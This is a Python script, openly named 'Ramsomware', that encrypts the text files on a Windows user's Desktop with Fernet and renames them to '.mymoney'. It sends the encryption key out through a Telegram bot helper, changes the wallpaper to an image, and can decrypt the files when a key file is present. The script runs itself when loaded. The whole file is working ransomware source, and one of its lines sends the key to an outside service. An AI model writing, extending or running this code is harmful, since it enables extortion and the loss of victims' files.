import os
import base64
from cryptography.fernet import Fernet
import sent_mes
import wp

class Ramsomware: 

    def __init__(self, key=None):
        self.key = key
        self.typ_crypt = None   
        self.file_target = ['txt']
   
    def generator_key(self):
        
        self.key = Fernet.generate_key()
        self.typ_crypt = Fernet(self.key)
        sent_mes.telegram_bot_sendtext(str(self.key))

    def read_key(self, path="24124576.txt"):
        with open(path, 'rb') as files_closed:
            aa = files_closed.read()
            self.key = files_closed.read()
            self.key = aa

    def seerch_file(self, path, types, w=False):
        for root, dirs, files in os.walk(path):
            for name in files:
                f = os.path.join(root, name)
                if types in f:
                    if w == True:
                        self.uncrypt(f)
                    else:
                        self.crypt(f)

    def crypt(self, path):
        with open(path, 'rb') as f:
            data = f.read()
            fernet = Fernet(self.key)
            encrypted = fernet.encrypt(data)
            with open(path,'wb') as f:
                f.write(encrypted)
        base = os.path.splitext(path)[0]
        os.rename(path, base + '.mymoney')    
    
    def uncrypt(self, path):
            base = os.path.splitext(path)[0]
            os.rename(path, base + '.txt') 
            path = base + '.txt'
            with open(path,'rb') as f:
                data = f.read()
            
            fernet = Fernet(self.key)  
            encrypted = fernet.decrypt(data)   

            with open(path, 'wb') as f:
                f.write(encrypted)
    
    def check_password(self):
            return os.path.exists('24124576.txt')

def check_crypt(path_dmg, types):

    for root, dirs, files in os.walk(path_dmg):
        for name in files:
            f = os.path.join(root, name)
            if types in f:
                return True
    return False

def start_to_the_end():
    User=str(os.getenv('USERPROFILE'))
    User = User + '\\Desktop'
    wr = Ramsomware()
    print(User)

    if check_crypt(User,'.txt') & ~wr.check_password():
        wr.generator_key()
        wr.seerch_file(User,'.txt')
        dir = os.path.abspath(os.curdir)
        imagePath = dir + "/bin/text/exe/1.jpg"
        wp.changeBG(imagePath)
    else:
        if check_crypt(User,'.mymoney') & wr.check_password():
            wr.read_key()
            wr.seerch_file(User,'.mymoney', True)
        else:
            print('nie ok')

start_to_the_end()




